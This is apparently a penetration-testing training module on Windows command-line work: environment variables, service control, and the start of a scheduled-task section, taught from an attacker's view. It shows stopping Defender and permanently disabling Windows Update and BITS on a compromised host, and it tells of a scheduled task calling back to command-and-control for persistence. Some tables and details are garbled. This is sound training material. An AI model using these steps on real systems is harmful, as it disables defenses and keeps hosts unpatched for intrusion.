Let us go ahead and create a variable to hold up the value of the IP address of the Domain Controller `(DC)` since we might find it useful for testing connectivity to the domain or querying for updates. We can do this with the `set` command.
#### Using set

```cmd
C:\htb> set DCIP=172.16.5.2
```

> Upon running this command, there is no immediate output. However, know that the variable has been set for our current command prompt session. We can verify this by printing out its value using `echo`. 
#### Validating the Change

```cmd
C:\htb> echo %DCIP%

172.16.5.2
```

> As we can see, the environment variable `%DCIP%` is now set and available for us to access. 

As stated above, this change is considered part of the `process` scope, as whenever we exit the command prompt and start a new session, this variable will cease to exist on the system. 

We can remedy this situation by permanently setting this variable in the environment using `setx`

```cmd
C:\htb> setx DCIP 172.16.5.2

SUCCESS: Specified value was saved.
```
#### Using setx

```cmd
C:\htb> setx DCIP 172.16.5.2

SUCCESS: Specified value was saved.
```

> From this example, we can see that the syntax between commands varies slightly. Previously, we had to set the variable's value equal to the variable itself. Here we have to provide the variable's name followed by the value. 

The syntax is as follows: `setx <variable name> <value> <parameters>`. After running this command, we see that our value was saved in the registry since we were provided with the `SUCCESS` message.

Of course, if we are curious if the value is truly set, we can validate it exactly as done above. Remember that this change will only occur after we open up another command prompt session. 

*On a remote system, variables created or modified by this tool will be available at the next logon session.*
#### Editing Variables

In addition to creating our own variables, we can edit existing ones. Since we are already familiar with creating them, editing is just as easy, except we will replace the existing values. 

Let us say that the IP address of our `DC` changed, and we need to update the value of our custom environment variable to reflect this change. 
#### Using setx

```cmd
C:\htb> setx DCIP 172.16.5.5

SUCCESS: Specified value was saved.
```

> In the previous example, we set `172.16.5.2` as the value for the DC on the network; however, using `set`, we can update this value by simply setting the value again to our new address, `172.26.5.5`. 
#### Validating the Edit

```cmd
C:\htb> echo %DCIP%

172.16.5.5
```

We have successfully edited our initial custom variable to reflect the DC's IP change. We can now move on and discuss removing variables.
#### Removing Variables

> Much like creating and editing variables, we can also remove environment variables in a very similar manner.

To remove variables, we cannot directly delete them like we would a file or directory; instead, we must clear their values by setting them equal to nothing. 

This action will effectively delete the variable and prevent it from being used as intended due to the value being removed. 

In our first example, we created the variable `%DCIP%` containing the value of the IP address of the domain controller on the network and permanently saved it into the registry. We can attempt to remove it by doing the following:
#### Using `setx`

```cmd
C:\htb> setx DCIP ""


SUCCESS: Specified value was saved.
```

> This command will remove `%DCIP%` from our system's current environment variables and will also be reflected in the registry once we open a new command prompt session.

We can verify that this is indeed the case by doing the following:
#### Verifying the Variable has Been Removed

```cmd
C:\htb> set DCIP
Environment variable DCIP not defined

C:\htb> echo %DCIP%
%DCIP%
```

> Using both `set` and `echo`, we can verify that the `%DCIP%` variable is not longer set and is not defined in our environment anymore.
### Important Environment Variables

> Now that we are comfortable creating, editing and removing our own environment variables, let us discuss some crucial variables we should be aware of when performing enumeration on a host's environment.

*Remember that all information found he is provided to us in clear text due to the nature of environment variables.*

As an attacker, this can provide us with a wealth of information about the current system and the user account accessing it.

| Variable Name       | Description                                                                                                                                                                                                                                                                                |
| ------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `%PATH%`          |
| -------------- | -------------------------------------------------------------------------------------------------- |
| `%PATH%`       | Specifies a set of directories (locations) where executable programs are located.                  |
| `%OS%`         | The current operating system on the user's workstation.                                            |
| `%SYSTEMROOT%` | Expands to `C:\Windows`. A system-defined read-only variable containing the Windows system folder. |
| ``             |                                                                                                    | Specifies a set of directories (locations) where executable programs are located.                                                                                                                                                                                                          |
| `%OS%`              | The current operating system on the user's workstation.                                                                                                                                                                                                                                    |
| `%SYSTEMROOT%`      | Expands to `C:\Windows`. A system-defined read-only variable containing the Windows system folder.                                                                                                                                                                                         |
| `%LOGONSERVER%`       | Provides us with the login server for the currently active user followed by the machine's hostname. We can use this information to know if a machine is joined to a domain or workgroup.                                                                                                   |
| `%USERPROFILE%`       | Provides us with the location of the currently active user's home directory. Expands to `C:\Users\{username}`.                                                                                                                                                                             |
| `%ProgramFiles%`      | Equivalent of `C:\Program Files`. This location is where all the programs are installed on an `x64` based system.                                                                                                                                                                          |
| `%ProgramFiles(x86)%` | Equivalent of `C:\Program Files (x86)`. This location is where all 32-bit programs running under `WOW64` are installed. Note that this variable is only accessible on a 64-bit host. It can be used to indicate what kind of host we are interacting with. (`x86` vs. `x64` architecture.) |
> Provided here is only a tiny fraction of the information we can learn through enumerating the environment variables on a system. However, the above mentioned ones will often appear when performing enumeration on an engagement. 

For a complete list, we can visit the following [link](https://ss64.com/nt/syntax-variables.html). Using this information as a guide, we can start gathering any required information from these variables to help us learn about our host and its target environment inside and out. 

### Moving On

Following the end of this section, we should have a comfortable grasp of what environment variables are and how we can manage them in a system. Environment variables are a part of the core functionality of the Windows OS and are considered very useful to both attackers and defenders. Any modifications that can affect system-wide variables should be handled with extreme caution. 

If we find it necessary for our scripts or tools, make a new variable before editing one already on the system. Now that we have that information out of the way let us move on to using the command line to work with services on our host.

# Managing Services

> Monitoring and controlling services on a host is integral to being an administrator. As an attacker, the ability to interrogate services, find solid points to hook into, and turn services on or off is a sought-after ability when landing on a host. 

In this section, we will look at the usage of `sc`, the Windows command line service controller utility, but we will go about it a little differently. Let's look at this from the perspective of an attacker. We have just landed on a victims host and need to:

- *Determine what services are running*
- *Attempt to disable antivirus*
- *Modify existing services on a system*
### Service Controller

[SC](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754599(v=ws.11)) is a Windows executable utility that allows us to query, modify and manage host services locally and over the network. For most of this section, we will utilize `SC` as our defacto way to handle services. We have other tools, like Windows Management Instrumentation (`WMIC`) and `TaskList` that can also query and manage service for local and remote hosts.

Let's dive in and give `sc` a try.
#### SC without Parameters

```cmd
C:\htb> sc  

DESCRIPTION:
        SC is a command line program used for communicating with the
        Service Control Manager and services.
USAGE:
        sc <server> [command] [service name] <option1> <option2>...


        The option <server> has the form "\\ServerName"
        Further help on commands can be obtained by typing: "sc [command]"
        Commands:
          query-----------Queries the status for a service, or
                          enumerates the status for types of services.
          queryex---------Queries the extended status for a service, or
                          enumerates the status for types of services.
          start-----------Starts a service.
          pause-----------Sends a PAUSE control request to a service.

<SNIP>  

SYNTAX EXAMPLES
sc query                - Enumerates status for active services & drivers
sc query eventlog       - Displays status for the eventlog service
sc queryex eventlog     - Displays extended status for the eventlog service
sc query type= driver   - Enumerates only active drivers
sc query type= service  - Enumerates only Win32 services
sc query state= all     - Enumerates all services & drivers
sc query bufsize= 50    - Enumerates with a 50 byte buffer
sc query ri= 14         - Enumerates with resume index = 14
sc queryex group= ""    - Enumerates active services not in a group
sc query type= interact - Enumerates all interactive services
sc query type= driver group= NDIS     - Enumerates all NDIS drivers
```

> As we can see, SC without parameters functions like most commands and provides us with the help context and a couple of great examples to get started with printed to the terminal output.
### Query Services

> Being able to `query` services for information such as the `process state`, `process id(pid)`, and `service type` is a valuable tool to have in our arsenal as an attacker. We can use this to check if certain services are running or check all existing services and drivers on the same system for further information.

Before we look specifically into checking the Windows Defender service, let's see what services are currently actively running on the system. 

We can do so by issuing the following command: `sc query type= service`.

**Note:** The spacing for the optional query parameters is crucial. For example, `type= service`, `type=server` and `type =service` are completely different ways of spacing this parameter. However, only `type= service` is correct in this case.
#### Query All Active Services

```cmd
C:\htb> sc query type= service

SERVICE_NAME: Appinfo
DISPLAY_NAME: Application Information
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: AppXSvc
DISPLAY_NAME: AppX Deployment Service (AppXSVC)
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: AudioEndpointBuilder
DISPLAY_NAME: Windows Audio Endpoint Builder
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: Audiosrv
DISPLAY_NAME: Windows Audio
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: BFE
DISPLAY_NAME: Base Filtering Engine
        TYPE               : 20  WIN32_SHARE_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: BITS
DISPLAY_NAME: Background Intelligent Transfer Service
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_PRESHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

<SNIP>
```

We can see a complete list of the actively running services on this system. Using this information, we can thoroughly scope what is running on the system and look for anything that we wish to disable or in some cases, services that we can attempt to take over for our own purposes, whether it be for escalation or persistence. 

Returning to our scenario, we recently landed on a host and need to `query` the host and determine if Windows Defender is active. 

Let's give `sc query` a try.
#### Querying for Windows Defender

```cmd
C:\htb> sc query windefend    

SERVICE_NAME: windefend
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (NOT_STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

> Now, what do we see above? We can tell that Windows Defender is running, and, with our current permission set (the one in which we utilized for the query), does not have permission to stop or pause the service (likely because our user is a standard user and not an administrator.)

- We can test this by trying to stop the service.
### Stopping and Starting Services

#### Stopping an Elevated Service

```cmd
C:\htb> sc stop windefend

Access is denied.  
```

> As you can see from the above output, our current user doesn't have the proper permissions to stop or pause this particular service. To perform this action, we would likely need the permissions of an administrator account, and in some cases, certain services can only be handled by the system itself.

- Ideally, attempting to stop an elevated service like this is not the best way of testing permissions, as this will likely lead to us getting caught due to the traffic that will be kicked up from running a command like this.

Now that we've attempted and failed to stop the `windefend` service under a user with standard permissions let us showcase what would happen if we did indeed gain access to an account containing local administrator privileges for the machine. 

We can attempt to stop service via the `sc stop <service name>` command. Let's try the previous example once again with elevated permissions as the `Administrator` user.
#### Stopping an Elevated Service as an Administrator

```cmd
C:\WINDOWS\system32> sc stop windefend

Access is denied.
```

> It seems we still do not have the proper access to stop this service in particular. This is a good lesson for us to learn, as certain processed are protected under stricter requirements than what local administrator accounts have.
> 	In this scenario, the only thing that can stop and start the Defender service is the [SYSTEM](https://learn.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts#default-local-system-accounts) machine account. 

---

##### SYSTEM

> The *`SYSTEM`* account is used by the operating system and by services running under Windows. There are many services and processes in the Windows operating system that need the capability to sign in internally, such as during a Windows installation. 

The SYSTEM account was designed for that purpose, and Windows manages the SYSTEM account's user rights. 

It's an internal account that doesn't show up in User Manager, and it can't be added to any groups.

On the other hand, the SYSTEM account does appear on an NTFS file system volume in File Manager in the **Permissions** portion of the security menu. By default, the SYSTEM account is granted Full Control permissions to all files on an NTFS volume. 

Here is the system account that has the same functional rights and permissions as the Administrator account. 

---

As an attacker, learning the restrictions behind what certain accounts have access or lack of access to is very important because blindly trying to stop services will fill the logs with errors and trigger any alerts showing us that a user with insufficient privileges is trying to access a protected process on the system.

- This will catch the blue teams attention to our activities and begin a triage attempt to kick us off the system and lock us out permanently. 
#### Stopping Services

> Moving on, let's find ourselves a service we can take out as an Administrator.

The good news is that we can stop the Print Spooler service. Let's try to do so.
#### Finding the Print Spooler Service

```cmd
C:\WINDOWS\system32> sc query Spooler

SERVICE_NAME: Spooler
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

> As we can see from the output above, the `Spooler` service is actively running on our current system.
#### Stopping the Print Spooler Service

```cmd
C:\WINDOWS\system32> sc stop Spooler

SERVICE_NAME: Spooler
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x3
        WAIT_HINT          : 0x4e20

C:\WINDOWS\system32> sc query Spooler

SERVICE_NAME: Spooler
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

> As stated above, we can issue the command `sc stop Spooler` to have Windows issue a `STOP` control request to the service. It is important to note that not all services will respond to these requests, regardless of our permissions, especially if other running programs and services depend on the service we are attempting to stop.
#### Starting Services

> Much like stopping services, we are also able to start services as well. Although stopping services seems to offer a bit more practicality at first to the red team, being able to start services can lend itself to be especially useful in conjunction with being able to modify existing services.

Starting from our previous example, we are still working with the `Spooler` service that was stopped previously. 

We can restart this service by issuing the `sc start Spooler` command. Let's try it now.

```cmd
C:\WINDOWS\system32> sc start Spooler

SERVICE_NAME: Spooler
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 34908
        FLAGS              :

C:\WINDOWS\system32> sc query Spooler

SERVICE_NAME: Spooler
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

> We can see here that upon issuing a start request to the `Spooler` service, we can see that it begins in a `START_PENDING` state and, after another query, is fully up and operational. Typically services will take a few seconds or so to initialize after a request to start is issued. 
### Modifying Services

> In addition to being able to start and stop services, we can also modify existing services as well. This is where attackers can thrive as we try to modify existing services to serve whatever purpose we need them to.

In some cases, we can change them to be disabled at startup or modify the services to serve whatever purpose we need them to.

- Be aware that these examples are only some of the possibilities of the actions we can take.

With such *versatile command*, we have many options for manipulating services to do what we need them to. Let's go ahead and see if we can modify some services to prevent Windows from updating itself.
#### Disabling Windows Updates Using `SC`

To configure services, we must use the [config](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config) parameter in `sc`. This will allow us to modify the values of existing services, regardless of if they are running or not.

All changes made with this command are reflected in the Windows registry as well as the database for Service Control Manager (`SCM`). 

Remember that all changes to existing services will only fully update after restarting the service.

**Note**: It is important to be aware that modifying existing services can effectively take them out permanently as any changes made are recorded and saved in the registry, which can persist on reboot. Please exercise caution when modifying services in this manner.

---

With all of this information out of the way, let's try to take out Windows Updates for our current compromised host. 

Unfortunately, Windows Update feature (`Version 10 and above`) does not just rely on one service to perform its functionality. Windows updates rely on the following services:

| Service    | Display Name                            |
| ---------- | --------------------------------------- |
| `wuauserv` | Windows Update Service                  |
| `bits`     | Background Intelligent Transfer Service |
Let's query all of the required services and see what is currently running and needs to be stopped before making our required changes.

_Important: The scenario below requires access to a privileged account. Making updates to services will typically require a set of higher permissions than a regular user will have access to._
#### Checking the State of the Required Services

```cmd
C:\WINDOWS\system32> sc query wuauserv

SERVICE_NAME: wuauserv
        TYPE               : 30  WIN32
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\WINDOWS\system32> sc query bits

SERVICE_NAME: bits
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_PRESHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

> From the information provided above, we can see that the `wuauserv` service is not currently active as the system is not currently in the process of updating. 

However, the `bits` service (required to download updates) is currently running on our system. 

We can issue a stop to this service using our knowledge from the prior section by doing the following:
#### Stopping BITS

```cmd
C:\WINDOWS\system32> sc stop bits

SERVICE_NAME: bits
        TYPE               : 30  WIN32
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x0
```

> After ensuring that both services are currently stopped, we can modify the start type of both services. We can issue this change by performing the following:
#### Disabling Windows Update Service

```cmd-session
C:\WINDOWS\system32> sc config wuauserv start= disabled

[SC] ChangeServiceConfig SUCCESS
```
#### Disabling Background Intelligent Transfer Service

```cmd-session
C:\WINDOWS\system32> sc config bits start= disabled

[SC] ChangeServiceConfig SUCCESS
```

> We can now see that both services have been modified successfully. This means that when both services attempt to start, they will be unable to as they are currently disabled. As previously mentioned, this change will ***persist upon reboot, meaning that when the system attempts to check for updates or update itself, it cannot do so because both services will remain disabled.***

- We can verify that both services are indeed disabled by attempting to start them.
#### Verifying Services are Disabled

```cmd
C:\WINDOWS\system32> sc start wuauserv 

[SC] StartService FAILED 1058:

The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.

C:\WINDOWS\system32> sc start bits

[SC] StartService FAILED 1058:

The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.

```

**Note:** To revert everything back to normal, you can set `start= auto` to make sure that the services can be restarted and function appropriately.

We have verified that both services are now disabled, as we cannot start them manually. Due to the changes made here, Windows cannot utilize its updating feature to provide any system or security updates. This can be very beneficial to an attacker to ensure that a system can remain out of date and not retrieve any updates that would inhibit the usage of certain exploits on a target system. Be aware that by doing this in this manner, we will likely be triggering alerts for this sort of action set up by the resident blue team. This method is not quiet and does require elevated permissions in a lot of cases to perform.

---

### Other Routes to Query Services

> During the course of this section, we have only focused on using `sc` to query, start, stop and modify services. 

However, we have other choices regarding how to accomplish some of these same tasks using different commands. In this section, we will strictly focus on using some of these other commands to help with our enumeration by being able to query services and display the available information is different ways.
#### Using Tasklist

[Tasklist](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist) is a command line tool that gives us a list of currently running processes on a local or remote host. However, we can utilize the `/svc` parameter to provide a list of services running under each process on the system. Let's look at some of the output this can provide.

```cmd
C:\htb> tasklist /svc


Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                       108 N/A
smss.exe                       412 N/A
csrss.exe                      612 N/A
wininit.exe                    684 N/A
csrss.exe                      708 N/A
services.exe                   768 N/A
lsass.exe                      796 KeyIso, SamSs, VaultSvc
winlogon.exe                   856 N/A
svchost.exe                    984 BrokerInfrastructure, DcomLaunch, PlugPlay,
                                   Power, SystemEventsBroker
fontdrvhost.exe               1012 N/A
fontdrvhost.exe               1020 N/A
svchost.exe                    616 RpcEptMapper, RpcSs
svchost.exe                    996 LSM
dwm.exe                       1068 N/A
svchost.exe                   1236 CoreMessagingRegistrar
svchost.exe                   1244 lmhosts
svchost.exe                   1324 NcbService
svchost.exe                   1332 TimeBrokerSvc
svchost.exe                   1352 Schedule
<SNIP>
```

> As we can see, we have a full listing of processes that are currently running on the system, their respective `PID`, and what services are hosted under each process. This can be very helpful in quickly locating what process hosts what services.
#### Using Net Start

[Net start](https://ss64.com/nt/net-service.html) is a very simple command that will allow us to quickly list all of the current running services on a system. In addition to `net start`, there is also `net stop`, `net pause`, and `net continue`.

---

##### [NET](https://ss64.com/nt/net.html) START/STOP/PAUSE/CONTINUE

The NET command is used to manage services as follows:

Syntax
      NET START [_service_]
      NET STOP [_service_]
      NET PAUSE [_service_]
      NET CONTINUE [_service_] 
   
Key
   _service_ : The service name as shown in Control Panel, Services
##### Examples

List the basic Services:

> NET HELP SERVICES

List the _running_ Services:

> NET START

Stop the print spooler service and if sucessful restart it again:

> NET STOP spooler [&&](https://ss64.com/nt/syntax-redirection.html) NET START spooler

To use a long service name, surround it with quotes:

> NET STOP "HomeGroup Listener"

---

> These commands will behave similarly to `sc` as we can provide the name of the service afterward and be able to perform the actions specified in the command against the service that we provide. 

```cmd
C:\htb> net start

These Windows services are started:

   Application Information
   AppX Deployment Service (AppXSVC)
   AVCTP service
   Background Tasks Infrastructure Service
   Base Filtering Engine
   BcastDVRUserService_3321a
   Capability Access Manager Service
   cbdhsvc_3321a
   CDPUserSvc_3321a
   Client License Service (ClipSVC)
   CNG Key Isolation
   COM+ Event System
   COM+ System Application
   Connected Devices Platform Service
   Connected User Experiences and Telemetry
   CoreMessaging
   Credential Manager
   Cryptographic Services
   Data Usage
   DCOM Server Process Launcher
   Delivery Optimization
   Device Association Service
   DHCP Client
   <SNIP>
```

> From the output above, we can see that using `net start` without specifying a `service` will list all of the active services on the system.
#### Using WMIC

Last but not least, we have [WMIC](https://ss64.com/nt/wmic.html). The **Windows Management Instrumentation Command (WMIC)** allows us to retrieve a vast range of information from our local hosts across the network. 

The versatility of this command is wide in *that it allows for pulling such a wide arrangement of information.*

However, we will only be going over a very small subset of the functionality provided by the `SERVICE` component residing inside this application.

To list all services existing on our system and information on them, we can issue the following command: `wmic service list brief`

```cmd
C:\htb> wmic service list brief

ExitCode  Name                                      ProcessId  StartMode  State    Status
1077      AJRouter                                  0          Manual     Stopped  OK
1077      ALG                                       0          Manual     Stopped  OK
1077      AppIDSvc                                  0          Manual     Stopped  OK
0         Appinfo                                   5016       Manual     Running  OK
1077      AppMgmt                                   0          Manual     Stopped  OK
1077      AppReadiness                              0          Manual     Stopped  OK
1077      AppVClient                                0          Disabled   Stopped  OK
0         AppXSvc                                   9996       Manual     Running  OK
1077      AssignedAccessManagerSvc                  0          Manual     Stopped  OK
0         AudioEndpointBuilder                      2076       Auto       Running  OK
0         Audiosrv                                  2332       Auto       Running  OK
1077      autotimesvc                               0          Manual     Stopped  OK
1077      AxInstSV                                  0          Manual     Stopped  OK
1077      BDESVC                                    0          Manual     Stopped  OK
0         BFE                                       2696       Auto       Running  OK
0         BITS                                      0          Manual     Stopped  OK
0         BrokerInfrastructure                      984        Auto       Running  OK
1077      BTAGService                               0          Manual     Stopped  OK
0         BthAvctpSvc                               4448       Manual     Running  OK
1077      bthserv                                   0          Manual     Stopped  OK
0         camsvc                                    5676       Manual     Running  OK
0         CDPSvc                                    4724       Auto       Running  OK
1077      CertPropSvc                               0          Manual     Stopped  OK
0         ClipSVC                                   9156       Manual     Running  OK
1077      cloudidsvc                                0          Manual     Stopped  OK
0         COMSysApp                                 3668       Manual     Running  OK
0         CoreMessagingRegistrar                    1236       Auto       Running  OK
0         CryptSvc                                  2844       Auto       Running  OK
<SNIP>
```

> After doing so, we can see that we have a nice list containing important information such as the `Name`, `ProcessID`, `StartMode`, `State`, and `Status` of every service on the system, regardless of whether or not it is currently running. 

**Note:** It is important to be aware that the `WMIC` command-line utility is currently deprecated as of the current Windows version. As such, it is advised against relying upon using the utility in most situations. You can find further information regarding this change by following this [link](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic).
### Moving On

> As penetration testers, we will constantly interact with Windows services. Since we will not always have GUI access to a host on which we are trying to escalate privileges, we need to understand how to work with services via the command line in various ways.
> 
> 	In a later section, we walk through PowerShell equivalents for the commands show in this section a show a more blue team approach to working with and monitoring services.

# Working with Scheduled Tasks

> Scheduled tasks are an excellent way for administrators to ensure that tasks they want to run regularly happen, but they are also an excellent persistence point for attackers. In this section, we will discuss using schtasks to:

- *Learn how to check what tasks exist.*
- *Create a new task to help us automate actions or acquire a shell on the host.*
### What are Scheduled Tasks?

> The **Task Scheduler** allows us admins to perform routine tasks without having to kick them off manually. The scheduler will monitor the host for a specific set of conditions called triggers and execute the task once the conditions are met.

---

**Story Time: On several engagements, while pentesting an enterprise environment, I have been in a position where I landed on a host and needed a quick way to set persistence. Instead of doing anything crazy or pulling down another executable onto the host, I decided to search for or create a scheduled task that runs when a user logs in or the host reboots. In this scheduled task, I would set a trigger to open a new socket utilizing PowerShell, reaching out to my Command and Control infrastructure. This would ensure that I could get back in if I lost access to this host. If I were lucky, when the task I chose ran, I might also receive a SYSTEM-level shell back, elevating my privileges at the same time. It quickly ensured host access without setting off alarms with antivirus or data loss prevention systems.**

---

#### Triggers that Can Kick Off a Scheduled Task

- When a specific system event occurs
- At a specific time
- At a specific time on a daily schedule
- At a specific time on a weekly schedule
- At a specific time on a monthly schedule
- At a specific time on a monthly day-of-week schedule
- When the computer enters an idle state
- When the task is registered
- When the system is booted
- When a user logs on
- When a Terminal Server session changes state

> The list of triggers is extensive and gives us many options for having a task take action. Now that we know what scheduled tasks are and what can make the actionable, it is time to look at using them. 
### How to Utilize Schtasks

> In the sections provided below, we will go over exactly how we can utilize the `schtasks` command to its fullest extent. 

Additionally, as we go over them in greater detail, a formatted table providing the syntax for each action will be provided.

- Note that the sections provided here are not an end-all-be-all. Several of the repetitive parameters have been omitted. Be sure to check the help menu `/?` to see a complete list of what can be used.
#### Display Scheduled Tasks:

##### Query Syntax

| Action  | Parameter | Description                                                                                                                                                                                                                                         |
| ------- | --------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Query` |           | Performs a local or remote host search to determine what scheduled tasks exist. Due to permissions, not all tasks may be seen by a normal user.                                                                                                     |
|         | `/fo`     | Sets formatting options. We can specify to show results in the `Table`, `List`, or `CSV` output.                                                                                                                                                    |
|         | `/v`      | Sets verbosity to on, displaying the `advanced properties` set in displayed tasks when used with the List or CSV output parameter.                                                                                                                  |
|         | `/nh`     | Simplifies the output using the Table or CSV output format. This switch `removes` the `column headers`.                                                                                                                                             |
|         | `/s`      | Sets the DNS name or IP address of the host we want to connect to. `Localhost` is the `default` specified. If `/s` is utilized, we are connecting to a remote host and must format it as "\\host".                                                  |
|         | `/u`      | This switch will tell schtasks to run the following command with the `permission set` of the `user` specified.                                                                                                                                      |
|         | `/p`      | Sets the `password` in use for command execution when we specify a user to run the task. Users must be members of the Administrator's group on the host (or in the domain). The `u` and `p` values are only valid when used with the `s` parameter. |
> We can view the tasks that already exist on our host by utilizing the `schtasks` command like so:

```cmd
C:\htb> SCHTASKS /Query /V /FO list

Folder: \  
HostName:                             DESKTOP-Victim
TaskName:                             \Check Network Access
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive only
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               DESKTOP-Victim\htb-admin
Task To Run:                          C:\Windows\System32\cmd.exe ping 8.8.8.8
Start In:                             N/A
Comment:                              quick ping check to determine connectivity. If it passes, other tasks will kick off. If it fails, they will delay.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          tru7h
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

<SNIP>
```

> Chaining our parameters with `Query` allows us to format our output from the standard bulk into a list with advanced settings. The above output shows how the tasks would look in a list format. 
#### Create a New Scheduled Task:

##### Create Syntax

| Action   | Parameter | Description                                                                                                              |
| -------- | --------- | ------------------------------------------------------------------------------------------------------------------------ |
| `Create` |           | Schedules a task to run.                                                                                                 |
|          | `/sc`     | Sets the schedule type. It can be by the minute, hourly, weekly, and much more. Be sure to check the options parameters. |
|          | `/tn`     | Sets the name for the task we are building. Each task must have a unique name.                                           |
|          | `/tr`     | Sets the trigger and task that should be run. This can be an executable, script or batch file.                           |
|          | `/s`      | Specify the host to run on, much like in Query.                                                                          |
|          | `/u`      | Specifies the local user or domain user to utilize                                                                       |
|          | `/p`      | Sets the Password of the user-specified.                                                                                 |
|          | `/mo`     | Allows us to set a modifier to run within our set schedule.                                                              |
|          | `/rl`     | Allows us to limit the privileges of the task. Options here are `limited` and `Highest`. Limited is the *default value*. |
|          | `/z`      | Will set the task to be deleted after completion of its actions.                                                         |
> Creating a new scheduled task is pretty straightforward. At a minimum, we must specify the following:

- `/create`: to tell it what we are doing.
- `/sc`: we must set a schedule
- `/tn`: we must give it a value
